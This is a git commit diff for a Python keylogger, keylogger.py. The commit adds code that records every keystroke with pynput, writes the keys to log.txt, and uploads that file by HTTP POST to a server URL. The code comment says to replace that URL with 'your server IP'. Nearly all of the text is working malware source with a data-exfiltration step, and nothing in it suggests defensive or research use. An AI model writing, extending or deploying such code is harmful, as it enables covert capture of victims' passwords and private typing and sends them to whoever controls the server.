e5c7b7b99ae31fe0e48c02eabc1124de6f7ff6cb
Ahamed salim <129469131+ahmd-salim@users.noreply.github.com>
2023-12-07 15:46:28 +0530

    Update keylogger.py
    Added the functionality for the keylogger to send the log.txt file to a local server.

--- keylogger.py
+++ keylogger.py
@@ -1,7 +1,11 @@
+import requests
 from pynput.keyboard import Key, Listener
 
 count = 0
 keys = []
+WORDS_LIMIT = 5
+
+SERVER_URL = "http://127.0.0.1:5000/upload"  # Replace with your server IP
 
 def on_press(key):
     global keys, count
@@ -12,19 +16,34 @@ def on_press(key):
         keys = []
     else:
         count += 1
-        print("{0} is pressed".format(key))
+        if count >= WORDS_LIMIT:
+            write_file(keys)
+            send_to_server()
+            keys = []
+            count = 0
 
 def write_file(keys):
     with open("log.txt", "a") as f:
         for key in keys:
             if key == Key.space:
-                f.write("\n")  # Add a new line after space bar
+                f.write(" ")  # Add a space instead of a new line
             else:
-                f.write(str(key).replace("'", ""))  # Remove single quotes
-        f.write(" ")  # Add a space between key sets
+                f.write(get_key_text(key))
+
+def get_key_text(key):
+    try:
+        return key.char
+    except AttributeError:
+        return str(key).replace("'", "").replace("Key.", "")
+
+def send_to_server():
+    files = {'file': open('log.txt', 'rb')}
+    response = requests.post(SERVER_URL, files=files)
 
 def on_release(key):
     if key == Key.esc:
+        write_file(keys)
+        send_to_server()
         return False
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
